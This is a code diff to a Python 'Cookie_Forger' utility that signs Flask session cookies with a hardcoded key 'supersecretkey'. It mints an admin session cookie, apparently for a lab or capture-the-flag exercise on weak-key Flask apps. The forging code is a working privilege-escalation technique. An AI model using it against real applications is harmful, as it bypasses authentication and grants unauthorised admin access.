@@ -1,6 +1,7 @@
+import secrets
+
 from flask.sessions import SecureCookieSessionInterface
 from flask import Flask
-import time
 from itsdangerous import BadSignature
 
 app = Flask(__name__)
@@ -15,24 +16,30 @@ class CustomSessionInterface(SecureCookieSessionInterface):
 class Cookie_Forger:
 
     @staticmethod
-    def generate_cookie_admin():
+    def generate_cookie_admin(session_id = secrets.token_bytes(32), secret_key = "supersecretkey"):
+        app.secret_key = secret_key
         session_serializer = CustomSessionInterface().get_signing_serializer(app)
 
         session_data = {
             "username": "admin",
             "role": "admin",
+            "session id": session_id,
         }
 
         cookie = session_serializer.dumps(session_data)
         return cookie
 
     @staticmethod
-    def generate_cookie(username, role):
+    def generate_cookie(username, role, session_id, secret_key = "supersecretkey"):
+        if not isinstance(secret_key, str):
+            raise TypeError("secret_key must be str")
+        app.secret_key = secret_key
         session_serializer = CustomSessionInterface().get_signing_serializer(app)
 
         session_data = {
             "username": username,
             "role": role,
+            "session id": session_id,
         }
 
         cookie = session_serializer.dumps(session_data)
@@ -61,4 +68,3 @@ if __name__ == "__main__":
     print("Forged cookie:")
     cookie = Cookie_Forger.generate_cookie_admin()
     print(cookie)
-    print(Cookie_Forger.inspect_cookie(cookie).get("created_time"))
